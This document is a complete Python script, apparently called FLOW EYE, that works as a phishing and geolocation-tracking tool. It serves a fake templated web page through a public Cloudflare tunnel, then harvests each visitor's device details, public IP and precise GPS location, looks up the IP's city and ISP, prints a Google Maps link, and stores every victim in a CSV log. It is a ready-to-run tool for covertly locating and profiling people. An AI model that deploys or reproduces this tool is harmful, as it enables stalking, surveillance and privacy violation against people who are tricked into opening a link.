#!/usr/bin/env python3
# -*- coding: utf-8 -*-

RED = '\033[31m'  # Red
GREEN = '\033[32m'  # Green
CYAN = '\033[36m'  # Cyan
WHITE = '\033[37m'  # White

from shutil import which

print(GREEN + '[+]' + CYAN + ' Checking Dependencies...' + WHITE)
required_packages = ['python3', 'pip3', 'php', 'ssh']
all_packages_installed = True
for package in required_packages:
    package_path = which(package)
    if package_path is None:
        print(RED + '[-] ' + WHITE + package + CYAN + ' is not Installed!')
        all_packages_installed = False
    else:
        pass
if not all_packages_installed:
    exit()

import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess
import random
import platform
import re
import shutil

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [ Available : manual ]')
parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [ Default : 8080 ]')

args = parser.parse_args()
provided_subdomain = args.subdomain
kml_filename = args.kml
tunnel_mode = args.tunnel
server_port = args.port

data_row, device_info_file, result_file = [], '', ''
script_version = '1.0'

def display_banner():
    print(GREEN + r"""
    
                ███████╗██╗      ██████╗ ██╗    ██╗    ███████╗██╗   ██╗███████╗
                ██╔════╝██║     ██╔═══██╗██║    ██║    ██╔════╝╚██╗ ██╔╝██╔════╝
                █████╗  ██║     ██║   ██║██║ █╗ ██║    █████╗   ╚████╔╝ █████╗  
                ██╔══╝  ██║     ██║   ██║██║███╗██║    ██╔══╝    ╚██╔╝  ██╔══╝  
                ██║     ███████╗╚██████╔╝╚███╔███╔╝    ███████╗   ██║   ███████╗
                ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝     ╚══════╝   ╚═╝   ╚══════╝
                                  
        [>] Welcome to FLOW EYE v1.0
        [>] Created By: Pknetmap
        
""" + WHITE)


def select_tunnel_mode(tunnel_mode=None):
    """Selects and starts Cloudflared Tunnel based on the mode."""
    if tunnel_mode is None:
        if is_cloudflared_installed():
            start_cloudflared_tunnel()
        else:
            download_cloudflared()
            start_cloudflared_tunnel()
    elif tunnel_mode == 'manual':
        print(GREEN + '[+]' + CYAN + ' Skipping Cloudflare, start your own tunnel service manually...' + WHITE + '\n')
    else:
        print(RED + '[+] Invalid Tunnel Mode Selected, Check Help [-h, --help]' + WHITE + '\n')
        exit(1)

def download_cloudflared():
    """Download Cloudflared based on system architecture and move it to /usr/local/bin."""
    print("[+] Downloading Cloudflared...")
    architecture = platform.machine()

    if "arm" in architecture or "Android" in platform.uname().system:
        download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
    elif "aarch64" in architecture:
        download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    elif "x86_64" in architecture:
        download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    else:
        download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"

    # Download Cloudflared
    subprocess.run(["wget", "--no-check-certificate", download_url, "-O", "cloudflared"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Make it executable
    os.chmod("cloudflared", 0o755)

    # Move to /usr/local/bin if possible
    try:
        shutil.move("cloudflared", "/usr/local/bin/cloudflared")
        print("[+] Cloudflared installed successfully to /usr/local/bin.")
    except PermissionError:
        print("[-] Permission denied. Try running with sudo: `sudo mv cloudflared /usr/local/bin/cloudflared`")
        return False

    return is_cloudflared_installed()

def is_cloudflared_installed():
    """Checks if Cloudflared is installed and accessible from PATH."""
    return shutil.which("cloudflared") is not None



def start_cloudflared_tunnel():
    """Start Cloudflared and retrieve the tunnel URL."""
    try:
        # Start Cloudflared tunnel process
        process = subprocess.Popen(
            ["/usr/local/bin/cloudflared", "tunnel", "--url", "http://localhost:8080"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )

        # Process Cloudflared output to find the tunnel URL
        for line in process.stdout:
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if match:
                print(f"[+] Tunnel URL: {match.group(0)}")
                return

        process.wait()
    except FileNotFoundError:
        print("[-] Cloudflared binary not found. Please install it first.")
    except Exception as e:
        print(f"[-] Error occurred: {e}")

    print("[-] Failed to retrieve tunnel URL.")



def select_template():
    global site_directory, device_info_file, result_file
    print(GREEN + '[+]' + CYAN + ' Select a Template : ' + WHITE + '\n')

    with open('template/templates.json', 'r') as template_file:
        template_info = template_file.read()

    template_json = json.loads(template_info)

    for item in template_json['templates']:
        template_name = item['name']
        print(GREEN + '[{}]'.format(template_json['templates'].index(item)) + CYAN + ' {}'.format(template_name) + WHITE)

    selected_template_index = int(input(GREEN + '[>] ' + WHITE))

    try:
        site_directory = template_json['templates'][selected_template_index]['dir_name']
    except IndexError:
        print('\n' + RED + '[-]' + CYAN + ' Invalid Input!' + WHITE + '\n')
        sys.exit()

    print('\n' + GREEN + '[+]' + CYAN + ' Loading {} Template...'.format(template_json['templates'][selected_template_index]['name']) + WHITE)

    module_enabled = template_json['templates'][selected_template_index]['module']
    if module_enabled:
        import_file = template_json['templates'][selected_template_index]['import_file']
        import importlib
        importlib.import_module('template.{}'.format(import_file))
    else:
        pass

    device_info_file = 'template/{}/php/info.txt'.format(site_directory)
    result_file = 'template/{}/php/result.txt'.format(site_directory)



def start_web_server():
    print('\n' + GREEN + '[+]' + CYAN + ' Port : ' + WHITE + str(server_port))
    print('\n' + GREEN + '[+]' + CYAN + ' Starting PHP Server......' + WHITE, end='')
    with open('logs/php.log', 'w') as php_log_file:
        subprocess.Popen(['php', '-S', '0.0.0.0:{}'.format(server_port), '-t', 'template/{}/'.format(site_directory)], stdout=php_log_file, stderr=php_log_file)
        time.sleep(3)
    try:
        php_request = requests.get('http://0.0.0.0:{}/index.html'.format(server_port))
        php_status_code = php_request.status_code
        if php_status_code == 200:
            print(CYAN + '[' + GREEN + ' Success ' + CYAN + ']' + WHITE)
        else:
            print(CYAN + '[' + RED + 'Status : {}'.format(php_status_code) + CYAN + ']' + WHITE)
    except requests.ConnectionError:
        print(CYAN + '[' + RED + ' Failed ' + CYAN + ']' + WHITE)
        cleanup_and_exit()

def wait_for_interaction():
    printed_message = False
    while True:
        time.sleep(2)
        file_size = os.path.getsize(result_file)
        if file_size == 0 and not printed_message:
            print('\n' + GREEN + '[+]' + CYAN + ' Waiting for User Interaction...' + WHITE + '\n')
            printed_message = True
        if file_size > 0:
            process_device_info()

def process_device_info():
    global device_info_file, result_file, data_row, device_latitude, device_longitude
    try:
        data_row = []
        with open(device_info_file, 'r') as info_file:
            info_content = info_file.read()
            device_info_json = json.loads(info_content)
            for device_data in device_info_json['dev']:

                device_os = device_data['os']
                device_platform = device_data['platform']
                try:
                    device_cores = device_data['cores']
                except TypeError:
                    device_cores = 'Not Available'
                device_ram = device_data['ram']
                device_vendor = device_data['vendor']
                device_renderer = device_data['render']
                device_resolution = device_data['wd'] + 'x' + device_data['ht']
                device_browser = device_data['browser']
                device_ip = device_data['ip']

                data_row.extend([device_os, device_platform, device_cores, device_ram, device_vendor, device_renderer, device_resolution, device_browser, device_ip])

                print(GREEN + '[+]' + CYAN + ' Device Information : ' + WHITE + '\n')
                print(GREEN + '[+]' + CYAN + ' OS          : ' + WHITE + device_os)
                print(GREEN + '[+]' + CYAN + ' Platform    : ' + WHITE + device_platform)
                print(GREEN + '[+]' + CYAN + ' CPU Cores   : ' + WHITE + device_cores)
                print(GREEN + '[+]' + CYAN + ' RAM         : ' + WHITE + device_ram)
                print(GREEN + '[+]' + CYAN + ' GPU Vendor  : ' + WHITE + device_vendor)
                print(GREEN + '[+]' + CYAN + ' GPU         : ' + WHITE + device_renderer)
                print(GREEN + '[+]' + CYAN + ' Resolution  : ' + WHITE + device_resolution)
                print(GREEN + '[+]' + CYAN + ' Browser     : ' + WHITE + device_browser)
                print(GREEN + '[+]' + CYAN + ' Public IP   : ' + WHITE + device_ip)

                ip_info_request = requests.get('http://free.ipwhois.io/json/{}'.format(device_ip))
                ip_info_status_code = ip_info_request.status_code

                if ip_info_status_code == 200:
                    ip_data = ip_info_request.text
                    ip_data_json = json.loads(ip_data)
                    device_continent = str(ip_data_json['continent'])
                    device_country = str(ip_data_json['country'])
                    device_region = str(ip_data_json['region'])
                    device_city = str(ip_data_json['city'])
                    device_org = str(ip_data_json['org'])
                    device_isp = str(ip_data_json['isp'])

                    data_row.extend([device_continent, device_country, device_region, device_city, device_org, device_isp])

                    print(GREEN + '[+]' + CYAN + ' Continent   : ' + WHITE + device_continent)
                    print(GREEN + '[+]' + CYAN + ' Country     : ' + WHITE + device_country)
                    print(GREEN + '[+]' + CYAN + ' Region      : ' + WHITE + device_region)
                    print(GREEN + '[+]' + CYAN + ' City        : ' + WHITE + device_city)
                    print(GREEN + '[+]' + CYAN + ' Org         : ' + WHITE + device_org)
                    print(GREEN + '[+]' + CYAN + ' ISP         : ' + WHITE + device_isp)
    except ValueError:
        pass

    try:
        with open(result_file, 'r') as result_file_handle:
            result_content = result_file_handle.read()
            location_info_json = json.loads(result_content)
            for location_data in location_info_json['info']:
                device_latitude = location_data['lat'] + ' deg'
                device_longitude = location_data['lon'] + ' deg'
                device_accuracy = location_data['acc'] + ' m'

                device_altitude = location_data['alt']
                device_altitude = 'Not Available' if device_altitude == '' else device_altitude + ' m'

                device_direction = location_data['dir']
                device_direction = 'Not Available' if device_direction == '' else device_direction + ' deg'

                device_speed = location_data['spd']
                device_speed = 'Not Available' if device_speed == '' else device_speed + ' m/s'

                data_row.extend([device_latitude, device_longitude, device_accuracy, device_altitude, device_direction, device_speed])

                print('\n' + GREEN + '[+]' + CYAN + ' Location Information : ' + WHITE + '\n')
                print(GREEN + '[+]' + CYAN + ' Latitude    : ' + WHITE + device_latitude)
                print(GREEN + '[+]' + CYAN + ' Longitude   : ' + WHITE + device_longitude)
                print(GREEN + '[+]' + CYAN + ' Accuracy    : ' + WHITE + device_accuracy)
                print(GREEN + '[+]' + CYAN + ' Altitude    : ' + WHITE + device_altitude)
                print(GREEN + '[+]' + CYAN + ' Direction   : ' + WHITE + device_direction)
                print(GREEN + '[+]' + CYAN + ' Speed       : ' + WHITE + device_speed)
    except ValueError:
        error_message = result_content # Corrected: Use result_content which holds the error message
        print('\n' + RED + '[-] ' + WHITE + error_message)
        repeat_process()



    print('\n' + GREEN + '[+]' + CYAN + ' Google Maps.................: ' + WHITE + 'https://www.google.com/maps/place/' + device_latitude.strip(' deg') + '+' + device_longitude.strip(' deg'))

    if kml_filename is not None:
        generate_kml(device_latitude, device_longitude)

    output_to_csv()
    repeat_process()

def generate_kml(device_latitude, device_longitude):
    with open('template/sample.kml', 'r') as kml_template_file:
        kml_template_data = kml_template_file.read()

    kml_template_data = kml_template_data.replace('LONGITUDE', device_longitude.strip(' deg'))
    kml_template_data = kml_template_data.replace('LATITUDE', device_latitude.strip(' deg'))

    with open('{}.kml'.format(kml_filename), 'w') as kml_output_file:
        kml_output_file.write(kml_template_data)

    print(GREEN + '[+]' + CYAN + ' KML File Generated..........: ' + WHITE + os.getcwd() + '/{}.kml'.format(kml_filename))

def output_to_csv():
    global data_row
    with open('db/results.csv', 'a') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(data_row)
    print(GREEN + '[+]' + CYAN + ' New Entry Added in Database.: ' + WHITE + os.getcwd() + '/db/results.csv')

def clear_result_and_info():
    global result_file, device_info_file
    with open(result_file, 'w+'):
        pass
    with open(device_info_file, 'w+'):
        pass

def repeat_process():
    clear_result_and_info()
    wait_for_interaction()
    process_device_info()

def cleanup_and_exit():
    global result_file
    with open(result_file, 'w+'):
        pass
    os.system('pkill php')
    exit()

try:
    display_banner()
    select_tunnel_mode()
    select_template()
    start_web_server()
    wait_for_interaction()
    process_device_info()

except KeyboardInterrupt:
    print('\n' + RED + '[!]' + CYAN + ' Keyboard Interrupt.' + WHITE)
    cleanup_and_exit()
